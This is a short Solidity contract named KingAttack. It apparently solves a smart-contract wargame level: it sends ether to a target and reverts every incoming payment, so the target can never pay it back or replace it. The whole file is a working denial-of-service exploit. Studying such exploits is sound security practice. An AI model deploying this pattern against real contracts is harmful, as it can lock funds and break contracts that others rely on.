// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttack {
    function attack(address target) public payable {
        (bool success, ) = target.call{value: msg.value}("");
        require(success, "KingAttack: Attack failed!");
    }

    receive() external payable {
        revert();
    }
}
